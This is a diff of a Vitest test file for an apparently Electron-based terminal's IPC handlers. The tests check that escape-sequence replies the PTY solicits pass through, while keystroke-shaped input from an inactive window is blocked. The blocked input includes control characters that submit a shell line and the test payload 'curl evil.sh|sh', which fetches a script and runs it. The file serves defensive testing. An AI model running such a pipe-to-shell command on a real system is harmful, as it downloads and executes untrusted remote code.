@@ -816,31 +816,35 @@ describe('registerIpcHandlers', () => {
     expect(forgetCredential).toHaveBeenCalledWith('c1')
   })
 
-  it('refuses a terminal submit with no real input behind it', () => {
+  it('always forwards the replies the PTY solicits', () => {
     const { on } = collectHandlers()
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
 
-    on.get('terminal:write')?.(inactiveAppEvent, 't1', 'curl evil.sh|sh\r')
-    expect(write).not.toHaveBeenCalled()
-    on.get('terminal:write')?.(inactiveAppEvent, 't1', 'evil\n')
+    // The PTY asks for these and the terminal must answer with no user input:
+    // DSR cursor position, device attributes, a focus report (mode 1004, set by
+    // tmux and vim), an SGR mouse report. Gating them would hang whatever asked.
+    const replies = ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', '\u001b[<0;10;5M']
+    for (const reply of replies) {
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply)
+      expect(write).toHaveBeenCalledWith('t1', reply)
+    }
+    expect(write).toHaveBeenCalledTimes(replies.length)
+  })
+
+  it('gates every keystroke-shaped payload, not just newline-bearing ones', () => {
+    const { on } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+
+    // Enumerating "what submits" would have missed these: EOT hands a partial
+    // line to a canonical-mode reader, and 0x0f executes the current line in
+    // both bash and zsh. The allowlist runs the other way, so they are gated.
+    for (const payload of ['ls', '\u0004', '\u000f', 'curl evil.sh|sh\r']) {
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', payload)
+    }
     expect(write).not.toHaveBeenCalled()
 
     on.get('terminal:write')?.(activeAppEvent, 't1', 'ls\r')
     expect(write).toHaveBeenCalledWith('t1', 'ls\r')
-  })
-
-  it('always forwards writes that cannot submit, including PTY replies', () => {
-    const { on } = collectHandlers()
-    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
-
-    // The PTY solicits these and the terminal must answer with no user input:
-    // a DSR cursor-position reply, a device-attributes reply, a focus report.
-    // Gating the whole channel would hang whatever asked.
-    for (const reply of ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', 'ls']) {
-      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply)
-      expect(write).toHaveBeenCalledWith('t1', reply)
-    }
-    expect(write).toHaveBeenCalledTimes(4)
   })
 
   it('defaults password conflicts to keeping what is already stored', async () => {
